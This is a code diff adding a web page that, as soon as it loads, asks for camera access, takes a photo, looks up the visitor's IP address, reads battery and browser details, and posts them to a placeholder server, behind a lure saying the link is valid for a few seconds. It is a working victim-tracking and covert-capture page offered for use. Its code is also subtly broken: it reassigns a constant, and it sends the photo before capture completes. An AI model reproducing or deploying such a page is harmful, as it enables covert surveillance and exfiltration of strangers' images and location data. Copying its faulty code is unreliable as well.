@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Data</title>
+    <script>
+        // Fungsi untuk mendapatkan status baterai
+        function getBatteryStatus() {
+            return navigator.getBattery().then(function(battery) {
+                return {
+                    level: battery.level,
+                    charging: battery.charging
+                };
+            });
+        }
+
+        // Mengambil data dan mengirimkannya ke server
+        function sendData() {
+            // Ambil informasi user agent
+            const userAgent = navigator.userAgent;
+            
+            // Ambil foto dengan menggunakan kamera
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const dataUrl = "";
+            
+            // Mengambil gambar dari kamera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(function() {
+                        // Mengambil frame pertama dan gambar dari video
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        dataUrl = canvas.toDataURL('image/png');
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 2000);  // Tunggu 2 detik sebelum mengambil gambar
+
+                    // Ambil informasi IP (gunakan layanan pihak ketiga)
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(ipData => {
+                            // Kirim data ke server Anda
+                            const data = {
+                                photo: dataUrl,
+                                ip: ipData.ip,
+                                battery: getBatteryStatus(),
+                                userAgent: userAgent
+                            };
+
+                            // Kirim data ke server Anda
+                            fetch('https://your-server-endpoint.com/capture', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(data)
+                            });
+                        });
+                });
+        }
+
+        window.onload = function() {
+            sendData();
+        };
+    </script>
+</head>
+<body>
+    <h1>Data Capture Page</h1>
+    <p>Link is valid for a few seconds...</p>
+</body>
+</html>
